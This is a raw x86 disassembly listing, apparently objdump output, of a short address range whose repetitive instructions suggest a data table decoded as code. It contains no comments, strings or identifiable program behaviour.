  401745:	add    BYTE PTR [ebx],dl
  401747:	add    BYTE PTR [edi],ch
  401749:	add    BYTE PTR [ebx],dl
  40174b:	add    BYTE PTR [ebx],dl
  40174d:	add    BYTE PTR [ebp+0x0],bh
  401750:	jle    0x401752
  401752:	lods   eax,DWORD PTR ds:[esi]
  401753:	add    BYTE PTR [esi+0x4b005500],ch
  401759:	add    BYTE PTR [ebx],dl
  40175b:	add    BYTE PTR [ebp+0x0],bh
  40175e:	jle    0x401760
  401760:	scas   eax,DWORD PTR es:[edi]
  401761:	add    BYTE PTR [eax+0x13004300],dh
  401767:	add    BYTE PTR [ebx],dl
  401769:	add    BYTE PTR [ebx],dl
  40176b:	add    BYTE PTR [ebx],dl
  40176d:	add    BYTE PTR [ebx+0x3e008c00],cl
  401773:	add    BYTE PTR [eax+eax*1],bh
  401776:	add    BYTE PTR cs:[ebx],dl
  401779:	add    BYTE PTR [ebx],dl
  40177b:	add    BYTE PTR [ebx],dl
  40177d:	add    BYTE PTR [ebx],dl
  40177f:	add    BYTE PTR [esi+0x23001400],cl
  401785:	add    BYTE PTR [ebx],dl
  401787:	add    BYTE PTR [eax+eax*1],al
  40178a:	nop
  40178b:	add    BYTE PTR [ebx],dl
  40178d:	add    BYTE PTR [ebx],dl
  40178f:	add    BYTE PTR [ebx],dl
  401791:	add    BYTE PTR [ecx+0x75009200],dl
  401797:	add    BYTE PTR [ebx+0x13008400],al
  40179d:	add    BYTE PTR [ebx],dl
  40179f:	add    BYTE PTR [ebx],dl
  4017a1:	add    BYTE PTR [ebx-0x7cffed00],dl
  4017a7:	add    BYTE PTR [eax+eax*1+0x230023],al
  4017ae:	adc    al,0x0
  4017b0:	adc    eax,DWORD PTR [eax]
  4017b2:	adc    eax,DWORD PTR [eax]
  4017b4:	adc    eax,DWORD PTR [eax]
  4017b6:	adc    eax,DWORD PTR [eax]
  4017b8:	xchg   BYTE PTR [eax],al
  4017ba:	xchg   DWORD PTR [eax],eax
  4017bc:	adc    eax,DWORD PTR [eax]
  4017be:	adc    al,0x0
  4017c0:	adc    eax,DWORD PTR [eax]
  4017c2:	xchg   ebp,eax
  4017c3:	add    BYTE PTR [ebx],dl
  4017c5:	add    BYTE PTR [ebx],dl
  4017c7:	add    BYTE PTR [ebx],dl
  4017c9:	add    BYTE PTR [esi-0x4eff7900],al
  4017cf:	add    BYTE PTR ds:0x1300b100,al
  4017d5:	add    BYTE PTR [ebx],dl
  4017d7:	add    BYTE PTR [ebx],dl
  4017d9:	add    BYTE PTR [ebx],dl
  4017db:	add    BYTE PTR [ecx+0x13002200],cl
  4017e1:	add    BYTE PTR [ecx+0x2f001300],dh
  4017e7:	add    BYTE PTR [ebx],dl
  4017e9:	add    BYTE PTR [ebx],dl
  4017eb:	add    BYTE PTR [ebx],dl
  4017ed:	add    BYTE PTR [edi-0x4eff6800],dl
  4017f3:	add    BYTE PTR [ebx+0x13008c00],cl
  4017f9:	add    BYTE PTR [ebx],dl
  4017fb:	add    BYTE PTR [ebx],dl
  4017fd:	add    BYTE PTR [edx-0x74ffed00],bl
  401803:	add    BYTE PTR [eax+eax*1+0xb100b1],cl
  40180a:	mov    cl,0x0
  40180c:	adc    eax,DWORD PTR [eax]
  40180e:	adc    eax,DWORD PTR [eax]
  401810:	adc    eax,DWORD PTR [eax]
  401812:	adc    eax,DWORD PTR [eax]
  401814:	mov    es,WORD PTR [eax]
  401816:	adc    al,0x0
  401818:	mov    cl,0x0
  40181a:	popf   
  40181b:	add    BYTE PTR [eax+eax*1],dl
  40181e:	adc    eax,DWORD PTR [eax]
  401820:	adc    eax,DWORD PTR [eax]
  401822:	adc    eax,DWORD PTR [eax]
  401824:	sahf   
  401825:	add    BYTE PTR [ebx],dl
  401827:	add    BYTE PTR [edi-0x4eff7900],bl
  40182d:	add    BYTE PTR [ecx+0x13001400],ah
  401833:	add    BYTE PTR [ebx],dl
  401835:	add    BYTE PTR [ebx],dl
  401837:	add    BYTE PTR [edx-0x5cffed00],ah
  40183d:	add    BYTE PTR [eax+eax*1+0x9700b1],ah
  401844:	cwde   
  401845:	add    BYTE PTR [ebx],dl
  401847:	add    BYTE PTR [ebx],dl
  401849:	add    BYTE PTR [ebx],dl
  40184b:	add    BYTE PTR [ebx+0x0],cl
  40184e:	adc    eax,DWORD PTR [eax]
  401850:	xchg   edi,eax
  401851:	add    BYTE PTR [eax-0x4eff4f00],bl
  401857:	add    BYTE PTR [ecx+0x13001300],dh
  40185d:	add    BYTE PTR [ebx],dl
  40185f:	add    BYTE PTR [ebx],dl
  401861:	add    BYTE PTR [esi-0x4effec00],ah
  401867:	add    BYTE PTR [ecx-0x57ff4f00],dh
  40186d:	add    BYTE PTR [ebx],dl
  40186f:	add    BYTE PTR [ebx],dl
  401871:	add    BYTE PTR [ebx],dl
  401873:	add    BYTE PTR [ebp-0x4effec00],bl
  401879:	add    BYTE PTR [edi+0x13008700],bl
  40187f:	add    BYTE PTR [ebx],dl
  401881:	add    BYTE PTR [ebx],dl
  401883:	add    BYTE PTR [ebp-0x60ffed00],dl
  401889:	add    BYTE PTR [edi-0x4eff4f00],al
  40188f:	add    BYTE PTR [ecx+0x13001300],dh
  401895:	add    BYTE PTR [ebx],dl
  401897:	add    BYTE PTR [ebx],dl
  401899:	add    BYTE PTR [ecx-0x4effec00],ah
  40189f:	add    BYTE PTR [ebx+0x1300a400],ah
  4018a5:	add    BYTE PTR [ebx],dl
  4018a7:	add    BYTE PTR [ebx],dl
  4018a9:	add    BYTE PTR [ebx+0x0],cl
  4018ac:	adc    eax,DWORD PTR [eax]
  4018ae:	mov    ds:0xb100a400,eax
  4018b3:	add    BYTE PTR [ecx+0x1300b100],dh
  4018b9:	add    BYTE PTR [ebx],dl
  4018bb:	add    BYTE PTR [ebx],dl
  4018bd:	add    BYTE PTR [ebx],dl
  4018bf:	add    BYTE PTR [esi-0x4effec00],ah
  4018c5:	add    BYTE PTR [ecx+0x1300b100],dh
  4018cb:	add    BYTE PTR [ebx],dl
  4018cd:	add    BYTE PTR [ebx],dl
  4018cf:	add    BYTE PTR [ebx],dl
  4018d1:	add    BYTE PTR [ebp-0x4eff5200],ch
  4018d7:	add    BYTE PTR [ecx+0x1300b100],dh
  4018dd:	add    BYTE PTR [ebx],dl
  4018df:	add    BYTE PTR [ebx],dl
  4018e1:	add    BYTE PTR [ebx],dl
  4018e3:	add    BYTE PTR [edi-0x4eff5000],ch
  4018e9:	add    BYTE PTR [ecx+0x1300b100],dh
  4018ef:	add    BYTE PTR [ebx],dl
  4018f1:	add    BYTE PTR [ebx],dl
  4018f3:	add    BYTE PTR [ebx],al
  4018f5:	add    BYTE PTR [ecx-0x4eff4f00],dh
  4018fb:	add    BYTE PTR [ecx-0x4eff4f00],dh
  401901:	add    BYTE PTR [ecx-0x4eff4f00],dh
  401907:	add    BYTE PTR [ecx-0x4eff4f00],dh
  40190d:	add    BYTE PTR [ecx-0x4eff4f00],dh
  401913:	add    BYTE PTR [ecx-0x4eff4f00],dh
  401919:	add    BYTE PTR [ecx-0x4eff4f00],dh
  40191f:	add    BYTE PTR [ecx-0x4eff4f00],dh
  401925:	add    BYTE PTR [ecx-0x4eff4f00],dh
  40192b:	add    BYTE PTR [ecx+0xb100],dh
  401931:	add    ch,ah
  401933:	add    DWORD PTR [eax],eax
  401935:	add    bh,ah
  401937:	add    DWORD PTR [edx+0x2],edi
  40193a:	jp     0x40193e
  40193c:	fadd   QWORD PTR [ecx]
  40193e:	sbb    eax,0x3a027a00
  401943:	add    BYTE PTR [eax+eax*1],bh
  401946:	inc    ebx
  401947:	add    BYTE PTR [eax],dh
  401949:	add    BYTE PTR [ebx],bh
  40194b:	add    BYTE PTR [ecx],dh
  40194d:	add    BYTE PTR ds:0x44003400,dh
  401953:	add    BYTE PTR [ebp+0x0],al
  401956:	aam    0x1
  401958:	jp     0x40195c
  40195a:	add    BYTE PTR [eax],al
  40195c:	jp     0x401960
  40195e:	mov    ecx,0x5101
  401963:	add    BYTE PTR [esi+0x0],al
  401966:	dec    ebx
  401967:	add    BYTE PTR [ecx+0x0],al
  40196a:	inc    eax
  40196b:	add    BYTE PTR [edi+0x0],al
  40196e:	push   eax
  40196f:	add    BYTE PTR [edi+0x0],cl
  401972:	ins    DWORD PTR es:[edi],dx
  401973:	add    BYTE PTR [edx+0x2],bh
  401976:	mov    eax,0x7a006301
  40197b:	add    bl,BYTE PTR [edx+0x0]
  40197e:	pop    edi
  40197f:	add    BYTE PTR [edi+0x0],ah
  401982:	ja     0x401984
  401984:	push   0x0
  401986:	imul   eax,DWORD PTR [eax],0x6f0068
  40198c:	xchg   esp,eax
  40198d:	add    BYTE PTR [ebp+0x70004e00],bl
  401993:	add    BYTE PTR [ebx+0x0],ch
  401996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401997:	add    BYTE PTR [edx+0x0],dh
  40199a:	jno    0x40199c
  40199c:	xchg   edi,eax
  40199d:	add    BYTE PTR [ebp+0x0],dh
  4019a0:	xchg   esi,eax
  4019a1:	add    BYTE PTR [ebp+0x0],bh
  4019a4:	scas   eax,DWORD PTR es:[edi]
  4019a5:	add    BYTE PTR [edx+0x2],bh
  4019a8:	mov    dh,0x0
  4019aa:	mov    edi,0x9f00
  4019af:	add    BYTE PTR [eax-0x3eff8a00],bh
  4019b5:	add    dh,bl
  4019b7:	add    ch,ah
  4019b9:	add    BYTE PTR [esi-0x31ff3400],ch
  4019bf:	add    BYTE PTR [edi-0x2fff0200],bl
  4019c5:	add    BYTE PTR [edi],al
  4019c7:	add    edx,ecx
  4019c9:	add    BYTE PTR [edx+0x2],bh
  4019cc:	adc    BYTE PTR [ecx],al
  4019ce:	jp     0x4019d2
  4019d0:	je     0x4019d2
  4019d2:	rol    DWORD PTR [eax],1
  4019d4:	jp     0x4019d8
  4019d6:	aam    0x0
  4019d8:	jp     0x4019dc
  4019da:	sbb    DWORD PTR [ecx],eax
  4019dc:	(bad)  
  4019dd:	add    dl,bl
  4019df:	add    dh,dl
  4019e1:	add    cl,ah
  4019e3:	add    BYTE PTR [edx+0x2],bh
  4019e6:	out    dx,eax
  4019e7:	add    BYTE PTR [edx+0x2],bh
  4019ea:	fiadd  WORD PTR [eax]
  4019ec:	and    al,BYTE PTR [ecx]
  4019ee:	sub    eax,DWORD PTR [ecx]
  4019f0:	xor    al,0x1
  4019f2:	cmp    eax,0xf601
  4019f7:	add    BYTE PTR [ecx],cl
  4019f9:	add    ebx,eax
  4019fb:	add    BYTE PTR [esi+0x1],al
  4019fe:	dec    edi
  4019ff:	add    edi,ebx
  401a01:	add    al,bh
  401a03:	add    BYTE PTR [ebx],bl
  401a05:	add    DWORD PTR [edx+0x2],edi
  401a08:	push   edi
  401a09:	add    DWORD PTR [edx+0x2],edi
  401a0c:	pop    esi
  401a0d:	add    DWORD PTR [edi+0x1],esp
  401a10:	jo     0x401a13
  401a12:	and    eax,0x79027a01
  401a17:	add    DWORD PTR [edx+0x2],edi
  401a1a:	add    BYTE PTR [ecx],0xc9
  401a1d:	add    DWORD PTR [ebx+0x2e019401],ecx
  401a23:	add    DWORD PTR [ebp+0x7a013f01],ebx
  401a29:	add    ah,BYTE PTR [ebp-0x53fd85ff]
  401a2f:	add    DWORD PTR [ebp-0x38fe41ff],esi
  401a35:	add    edx,ecx
  401a37:	add    DWORD PTR [edx+0x2],edi
  401a3a:	rol    DWORD PTR [ecx],1
  401a3c:	fiadd  DWORD PTR [ecx]
  401a3e:	jp     0x401a42
  401a40:	jecxz  0x401a43
  401a42:	in     al,dx
  401a43:	add    ebp,esi
  401a45:	add    eax,edi
  401a47:	add    DWORD PTR [edx+0x2],edi
  401a4a:	inc    DWORD PTR [ecx]
  401a4c:	or     BYTE PTR [edx],al
  401a4e:	pop    ecx
  401a4f:	add    DWORD PTR [eax],eax
  401a51:	add    BYTE PTR [eax+0x1],ah
  401a54:	jp     0x401a58
  401a56:	or     eax,DWORD PTR [edx]
  401a58:	adc    al,BYTE PTR [edx]
  401a5a:	adc    eax,0x1f021c02
  401a5f:	add    bh,BYTE PTR [edx+0x2]
  401a62:	add    ch,BYTE PTR es:[edi]
  401a65:	add    ch,BYTE PTR [ecx+0x1]
  401a68:	jp     0x401a6c
  401a6a:	cmp    BYTE PTR [edx],al
  401a6c:	jb     0x401a6f
  401a6e:	cmp    eax,DWORD PTR [edx]
  401a70:	inc    edx
  401a71:	add    cl,BYTE PTR [ebx+0x2]
  401a74:	test   BYTE PTR [ecx],al
  401a76:	dec    esi
  401a77:	add    bh,BYTE PTR [edx+0x2]
  401a7a:	push   ebp
  401a7b:	add    bl,BYTE PTR [esi+0x2]
  401a7e:	lea    eax,[ecx]
  401a80:	add    BYTE PTR [eax],al
  401a82:	add    dh,BYTE PTR [bx+si+0x2]
  401a86:	xchg   esi,eax
  401a87:	add    DWORD PTR [edx+0x2],edi
  401a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a8b:	add    DWORD PTR [edx+0x2],edi
  401a8e:	scas   al,BYTE PTR es:[edi]
  401a8f:	add    DWORD PTR [edx+0x2],edi
  401a92:	jp     0x401a96
  401a94:	ret    
  401a95:	add    edx,eax
  401a97:	add    ecx,eax
  401a99:	add    DWORD PTR [edx-0x47fe46ff],edi
  401a9f:	add    DWORD PTR [ecx-0x5efe55ff],esi
  401aa5:	add    DWORD PTR [ecx-0x78fe6fff],ebx
  401aab:	add    DWORD PTR [ebp+0x1],edi
  401aae:	jne    0x401ab1
  401ab0:	ins    BYTE PTR es:[edi],dx
  401ab1:	add    DWORD PTR [ebx+0x1],esp
  401ab4:	pop    esp
  401ab5:	add    DWORD PTR [ebx+0x1],edx
  401ab8:	inc    edx
  401ab9:	add    DWORD PTR [eax],edi
  401abb:	add    DWORD PTR [eax],esi
  401abd:	add    DWORD PTR [esi],ebp
  401abf:	add    DWORD PTR [esi],ebx
  401ac1:	add    DWORD PTR [ecx+eax*1],ecx
  401ac4:	add    al,BYTE PTR [ecx]
  401ac6:	in     eax,dx
  401ac7:	add    bl,ch
  401ac9:	add    cl,ch
  401acb:	add    cl,bl
  401acd:	add    BYTE PTR [eax+eax*1+0x6800a2],dh
	...
  401ae0:	add    BYTE PTR [eax],al
  401ae2:	add    al,BYTE PTR [eax]
  401ae4:	add    al,BYTE PTR [eax]
  401ae6:	add    al,BYTE PTR [eax]
  401ae8:	add    al,BYTE PTR [eax]
  401aea:	add    al,BYTE PTR [eax]
  401aec:	add    al,BYTE PTR [eax]
  401aee:	add    al,BYTE PTR [eax]
  401af0:	add    al,BYTE PTR [eax]
  401af2:	add    al,BYTE PTR [eax]
  401af4:	add    al,BYTE PTR [eax]
  401af6:	add    al,BYTE PTR [eax]
  401af8:	add    al,BYTE PTR [eax]
  401afa:	add    al,BYTE PTR [eax]
  401afc:	add    al,BYTE PTR [eax]
  401afe:	add    al,BYTE PTR [eax]
  401b00:	add    al,BYTE PTR [eax]
  401b02:	add    al,BYTE PTR [eax]
  401b04:	add    al,BYTE PTR [eax]
  401b06:	add    al,BYTE PTR [eax]
  401b08:	add    al,BYTE PTR [eax]
  401b0a:	add    al,BYTE PTR [eax]
  401b0c:	add    al,BYTE PTR [eax]
  401b0e:	add    al,BYTE PTR [eax]
  401b10:	add    al,BYTE PTR [eax]
  401b12:	add    al,BYTE PTR [eax]
  401b14:	add    al,BYTE PTR [eax]
  401b16:	add    al,BYTE PTR [eax]
  401b18:	add    al,BYTE PTR [eax]
  401b1a:	add    al,BYTE PTR [eax]
  401b1c:	pop    es
  401b1d:	add    BYTE PTR [edi],al
  401b1f:	add    BYTE PTR [edi],al
  401b21:	add    BYTE PTR [edi],al
  401b23:	add    BYTE PTR [edi],al
  401b25:	add    BYTE PTR [edi],al
  401b27:	add    BYTE PTR [edi],al
  401b29:	add    BYTE PTR [edi],al
  401b2b:	add    BYTE PTR [edi],al
  401b2d:	add    BYTE PTR [edi],al
  401b2f:	add    BYTE PTR [edi],al
  401b31:	add    BYTE PTR [edi],al
  401b33:	add    BYTE PTR [edi],al
  401b35:	add    BYTE PTR [edi],al
  401b37:	add    BYTE PTR [edi],al
  401b39:	add    BYTE PTR [edi],al
  401b3b:	add    BYTE PTR [edi],al
  401b3d:	add    BYTE PTR [edi],al
  401b3f:	add    BYTE PTR [edi],al
  401b41:	add    BYTE PTR [edi],al
  401b43:	add    BYTE PTR [edi],al
  401b45:	add    BYTE PTR [edi],al
  401b47:	add    BYTE PTR [edi],al
  401b49:	add    BYTE PTR [edi],al
  401b4b:	add    BYTE PTR [edi],al
  401b4d:	add    BYTE PTR [edi],al
  401b4f:	add    BYTE PTR [edi],al
  401b51:	add    BYTE PTR [edi],al
  401b53:	add    BYTE PTR [edi],al
  401b55:	add    BYTE PTR [ecx],cl
  401b57:	add    BYTE PTR [ecx],cl
  401b59:	add    BYTE PTR [ecx],cl
  401b5b:	add    BYTE PTR [edx],cl
  401b5d:	add    BYTE PTR [edx],cl
  401b5f:	add    BYTE PTR [eax+eax*1],cl
  401b62:	or     DWORD PTR [eax],eax
  401b64:	or     DWORD PTR [eax],eax
  401b66:	or     DWORD PTR [eax],eax
  401b68:	or     eax,DWORD PTR [eax]
  401b6a:	or     eax,DWORD PTR [eax]
  401b6c:	or     eax,DWORD PTR [eax]
  401b6e:	or     eax,0xe001000
  401b73:	add    BYTE PTR [ebx],cl
  401b75:	add    BYTE PTR [ebx],cl
  401b77:	add    BYTE PTR [ebx],cl
  401b79:	add    BYTE PTR [eax+eax*1],cl
  401b7c:	push   cs
  401b7d:	add    BYTE PTR [edi],cl
  401b7f:	add    BYTE PTR [ecx],dl
  401b81:	add    BYTE PTR [eax],dl
  401b83:	add    BYTE PTR [edi],cl
  401b85:	add    BYTE PTR [eax],bl
  401b87:	add    BYTE PTR [eax],bl
  401b89:	add    BYTE PTR [edx],dl
  401b8b:	add    BYTE PTR [edx],bl
  401b8d:	add    BYTE PTR [ebx],bl
  401b8f:	add    BYTE PTR ds:0x1d001c00,cl
  401b95:	add    BYTE PTR [esi],bl
  401b97:	add    BYTE PTR [edi],bl
  401b99:	add    BYTE PTR ds:0x20001c00,bl
  401b9f:	add    BYTE PTR [ebx],cl
  401ba1:	add    BYTE PTR [ecx],dl
  401ba3:	add    BYTE PTR [edx],dl
  401ba5:	add    BYTE PTR [edx],bl
  401ba7:	add    BYTE PTR [esi],bl
  401ba9:	add    BYTE PTR [eax+eax*1],ah
  401bac:	and    al,0x0
  401bae:	xor    BYTE PTR [eax],al
  401bb0:	sbb    eax,DWORD PTR [eax]
  401bb2:	rol    DWORD PTR [eax],1
  401bb4:	add    BYTE PTR es:[eax],dh
  401bb7:	add    BYTE PTR [eax],ah
  401bb9:	add    BYTE PTR [edi],bl
  401bbb:	add    BYTE PTR [ecx],ah
  401bbd:	add    BYTE PTR [ecx],ah
  401bbf:	add    BYTE PTR [ecx],ah
  401bc1:	add    BYTE PTR [ecx],ah
  401bc3:	add    BYTE PTR [edi],ah
  401bc5:	add    BYTE PTR [ecx],ah
  401bc7:	add    BYTE PTR [ecx],ah
  401bc9:	add    BYTE PTR [ecx],ah
  401bcb:	add    BYTE PTR [ecx],ah
  401bcd:	add    BYTE PTR [esi],ah
  401bcf:	add    BYTE PTR [eax],ch
  401bd1:	add    BYTE PTR [ecx],ch
  401bd3:	add    BYTE PTR [edx],ch
  401bd5:	add    BYTE PTR ds:0x2b002700,ch
  401bdb:	add    BYTE PTR [ecx],dh
  401bdd:	add    BYTE PTR [eax+eax*1],ch
  401be0:	xor    al,BYTE PTR [eax]
  401be2:	sub    al,0x0
  401be4:	inc    ecx
  401be5:	add    BYTE PTR [ecx],ch
  401be7:	add    BYTE PTR [eax],ch
  401be9:	add    BYTE PTR [eax+eax*1],ch
  401bec:	sub    eax,DWORD PTR [eax]
  401bee:	sub    al,BYTE PTR [eax]
  401bf0:	xor    al,BYTE PTR [eax]
  401bf2:	xor    al,0x0
  401bf4:	xor    eax,0x2d005000
  401bf9:	add    BYTE PTR [ecx],dh
  401bfb:	add    BYTE PTR ds:0x37003400,dh
  401c01:	add    BYTE PTR [eax+0x0],dl
  401c04:	aaa    
  401c05:	add    BYTE PTR [ecx+0x0],al
  401c08:	sub    DWORD PTR [eax],eax
  401c0a:	add    BYTE PTR cs:[esi],ch
  401c0d:	add    BYTE PTR [esi],ch
  401c0f:	add    BYTE PTR [eax],bh
  401c11:	add    BYTE PTR [ecx],bh
  401c13:	add    BYTE PTR [ecx],bh
  401c15:	add    BYTE PTR [esi],ch
  401c17:	add    BYTE PTR [esi],ch
  401c19:	add    BYTE PTR [esi],ch
  401c1b:	add    BYTE PTR [edi],ch
  401c1d:	add    BYTE PTR [edi],ch
  401c1f:	add    BYTE PTR [edi],ch
  401c21:	add    BYTE PTR [esi],bh
  401c23:	add    BYTE PTR [esi],bh
  401c25:	add    al,dl
  401c27:	add    BYTE PTR [edi],ch
  401c29:	add    BYTE PTR [edi],ch
  401c2b:	add    BYTE PTR [edi],ch
  401c2d:	add    BYTE PTR [ebx],dh
  401c2f:	add    BYTE PTR [ebx],dh
  401c31:	add    BYTE PTR [ebx],dh
  401c33:	add    BYTE PTR [ebx],dh
  401c35:	add    BYTE PTR [eax+0x0],cl
  401c38:	xor    eax,DWORD PTR [eax]
  401c3a:	xor    eax,DWORD PTR [eax]
  401c3c:	xor    eax,DWORD PTR [eax]
  401c3e:	xor    eax,DWORD PTR [eax]
  401c40:	add    BYTE PTR ss:[edx],bh
  401c43:	add    BYTE PTR [edx],bh
  401c45:	add    BYTE PTR [eax],bh
  401c47:	add    BYTE PTR [esi],dh
  401c49:	add    bh,cl
  401c4b:	add    BYTE PTR [edx],bh
  401c4d:	add    BYTE PTR [eax+eax*1],bh
  401c50:	cmp    al,0x0
  401c52:	cmp    al,0x0
  401c54:	inc    eax
  401c55:	add    BYTE PTR [eax+0x0],al
  401c58:	dec    eax
  401c59:	add    BYTE PTR [eax+eax*1],bh
  401c5c:	cmp    al,0x0
  401c5e:	cmp    al,0x0
  401c60:	cmp    eax,0x3d003d00
  401c65:	add    BYTE PTR [edx+0x0],al
  401c68:	inc    edx
  401c69:	add    BYTE PTR [ebp+0x0],ah
  401c6c:	cmp    eax,0x3d003d00
  401c71:	add    BYTE PTR [ebp+0x0],al
  401c74:	add    BYTE PTR gs:[ebp+0x0],al
  401c78:	dec    esp
  401c79:	add    BYTE PTR [eax+eax*1+0x46],cl
  401c7d:	add    BYTE PTR [esi+0x0],al
  401c80:	inc    edi
  401c81:	add    BYTE PTR [edi+0x0],al
  401c84:	dec    edx
  401c85:	add    BYTE PTR [ecx+0x0],dl
  401c88:	push   ecx
  401c89:	add    BYTE PTR [eax+0x0],al
  401c8c:	push   ebx
  401c8d:	add    BYTE PTR [ebx+0x0],dl
  401c90:	push   esi
  401c91:	add    BYTE PTR [esi+0x0],dl
  401c94:	into   
  401c95:	add    BYTE PTR [ebx+0x0],dl
  401c98:	push   edi
  401c99:	add    BYTE PTR [edi+0x0],dl
  401c9c:	inc    edx
  401c9d:	add    BYTE PTR [ebx+0x0],al
  401ca0:	inc    ebx
  401ca1:	add    BYTE PTR [ebx+0x0],al
  401ca4:	pop    eax
  401ca5:	add    BYTE PTR [ecx+0x0],bl
  401ca8:	pop    ecx
  401ca9:	add    BYTE PTR [ebx+0x0],al
  401cac:	inc    ebx
  401cad:	add    BYTE PTR [ebx+0x0],al
  401cb0:	inc    esp
  401cb1:	add    BYTE PTR [esi+0x0],al
  401cb4:	int    0x0
  401cb6:	inc    edi
  401cb7:	add    ah,cl
  401cb9:	add    BYTE PTR [edx+0x0],cl
  401cbc:	retf   
  401cbd:	add    BYTE PTR [eax+eax*1+0x44],al
  401cc1:	add    BYTE PTR [ebx+0x0],bl
  401cc4:	pop    ebx
  401cc5:	add    BYTE PTR [eax+0x0],bl
  401cc8:	inc    esp
  401cc9:	add    BYTE PTR [ebp+0x0],bl
  401ccc:	push   0x62004400
  401cd1:	add    BYTE PTR [edx+0x0],ah
  401cd4:	imul   eax,DWORD PTR [eax],0x68005d
  401cda:	inc    esp
  401cdb:	add    BYTE PTR [eax+eax*1+0x49],al
  401cdf:	add    BYTE PTR [ecx+0x0],cl
  401ce2:	dec    ecx
  401ce3:	add    BYTE PTR [ecx+0x0],cl
  401ce6:	retf   0x4900
  401ce9:	add    BYTE PTR [ecx+0x0],cl
  401cec:	dec    ecx
  401ced:	add    BYTE PTR [ecx+0x0],cl
  401cf0:	dec    ebx
  401cf1:	add    BYTE PTR [ebx+0x0],cl
  401cf4:	dec    ebx
  401cf5:	add    BYTE PTR [eax+eax*1+0x64],ah
  401cf9:	add    cl,cl
  401cfb:	add    BYTE PTR [ebx+0x0],cl
  401cfe:	dec    ebx
  401cff:	add    BYTE PTR [ebx+0x0],cl
  401d02:	dec    esi
  401d03:	add    BYTE PTR [esi+0x0],cl
  401d06:	dec    esi
  401d07:	add    BYTE PTR [esi+0x0],cl
  401d0a:	imul   eax,DWORD PTR [eax],0x4e004e
  401d10:	dec    esi
  401d11:	add    BYTE PTR [esi+0x0],cl
  401d14:	push   ebp
  401d15:	add    BYTE PTR [ebp+0x0],dl
  401d18:	push   ebp
  401d19:	add    BYTE PTR [edx+0x0],ch
  401d1c:	push   0x0
  401d1e:	enter  0x5500,0x0
  401d22:	push   ebp
  401d23:	add    BYTE PTR [ebp+0x0],dl
  401d26:	pop    esi
  401d27:	add    BYTE PTR [esi+0x0],bl
  401d2a:	pop    esi
  401d2b:	add    BYTE PTR [eax+eax*1+0x71],ah
  401d2f:	add    BYTE PTR [ecx+0x0],dh
  401d32:	pop    esi
  401d33:	add    BYTE PTR [esi+0x0],bl
  401d36:	pop    esi
  401d37:	add    BYTE PTR [edi+0x0],bl
  401d3a:	pop    edi
  401d3b:	add    BYTE PTR [edi+0x0],bl
  401d3e:	mov    DWORD PTR [eax],0xc60079
  401d44:	pop    edi
  401d45:	add    BYTE PTR [edi+0x0],bl
  401d48:	pop    edi
  401d49:	add    BYTE PTR [eax+0x0],ah
  401d4c:	pusha  
  401d4d:	add    BYTE PTR [eax+0x0],ah
  401d50:	pusha  
  401d51:	add    ch,al
  401d53:	add    BYTE PTR [eax+0x0],ah
  401d56:	pusha  
  401d57:	add    BYTE PTR [eax+0x0],ah
  401d5a:	pusha  
  401d5b:	add    BYTE PTR [ecx+0x0],ah
  401d5e:	popa   
  401d5f:	add    BYTE PTR [ecx+0x0],ah
  401d62:	jnp    0x401d64
  401d64:	jnp    0x401d66
  401d66:	les    eax,FWORD PTR [eax]
  401d68:	popa   
  401d69:	add    BYTE PTR [ecx+0x0],ah
  401d6c:	popa   
  401d6d:	add    BYTE PTR [esi+0x0],ah
  401d70:	data16 add BYTE PTR [esi+0x0],ah
  401d74:	data16 add BYTE PTR [ecx+0x0],bh
  401d78:	data16 add BYTE PTR [esi+0x0],ah
  401d7c:	data16 add BYTE PTR [esi+0x0],ah
  401d80:	add    BYTE PTR [bx+0x0],ah
  401d84:	add    BYTE PTR [bx+0x0],ah
  401d88:	ret    
  401d89:	add    BYTE PTR [edi+0x0],ah
  401d8c:	add    BYTE PTR [bx+0x0],ah
  401d90:	add    BYTE PTR [si+0x0],ch
  401d94:	ins    BYTE PTR es:[edi],dx
  401d95:	add    BYTE PTR [edi-0x3dff7100],cl
  401d9b:	add    BYTE PTR [eax+eax*1+0x6e],ch
  401d9f:	add    BYTE PTR [esi+0x0],ch
  401da2:	outs   dx,BYTE PTR ds:[esi]
  401da3:	add    BYTE PTR [ecx-0x3eff6f00],dl
  401da9:	add    BYTE PTR [esi+0x0],ch
  401dac:	outs   dx,BYTE PTR ds:[esi]
  401dad:	add    BYTE PTR [esi+0x0],ch
  401db0:	outs   dx,DWORD PTR ds:[esi]
  401db1:	add    BYTE PTR [edi+0x0],ch
  401db4:	outs   dx,DWORD PTR ds:[esi]
  401db5:	add    BYTE PTR [ebx-0x3fff6500],bl
  401dbb:	add    BYTE PTR [edi+0x0],ch
  401dbe:	outs   dx,DWORD PTR ds:[esi]
  401dbf:	add    BYTE PTR [edi+0x0],ch
  401dc2:	jo     0x401dc4
  401dc4:	jo     0x401dc6
  401dc6:	jo     0x401dc8
  401dc8:	sahf   
  401dc9:	add    BYTE PTR [esi+0x7000bf00],bl
  401dcf:	add    BYTE PTR [eax+0x0],dh
  401dd2:	jo     0x401dd4
  401dd4:	jae    0x401dd6
  401dd6:	jae    0x401dd8
  401dd8:	jae    0x401dda
  401dda:	jae    0x401ddc
  401ddc:	mov    esi,0x73007300
  401de1:	add    BYTE PTR [ebx+0x0],dh
  401de4:	jae    0x401de6
  401de6:	jne    0x401de8
  401de8:	jne    0x401dea
  401dea:	jne    0x401dec
  401dec:	mov    ds:0xbd00a200,al
  401df1:	add    BYTE PTR [ebp+0x0],dh
  401df4:	jne    0x401df6
  401df6:	jne    0x401df8
  401df8:	ja     0x401dfa
  401dfa:	ja     0x401dfc
  401dfc:	ja     0x401dfe
  401dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dff:	add    BYTE PTR [edi+0x7700bc00],ah
  401e05:	add    BYTE PTR [edi+0x0],dh
  401e08:	ja     0x401e0a
  401e0a:	js     0x401e0c
  401e0c:	js     0x401e0e
  401e0e:	js     0x401e10
  401e10:	stos   DWORD PTR es:[edi],eax
  401e11:	add    BYTE PTR [ebx+0x7800bb00],ch
  401e17:	add    BYTE PTR [eax+0x0],bh
  401e1a:	js     0x401e1c
  401e1c:	jp     0x401e1e
  401e1e:	jp     0x401e20
  401e20:	jp     0x401e22
  401e22:	jp     0x401e24
  401e24:	mov    edx,0x7a007a00
  401e29:	add    BYTE PTR [edx+0x0],bh
  401e2c:	jp     0x401e2e
  401e2e:	jge    0x401e30
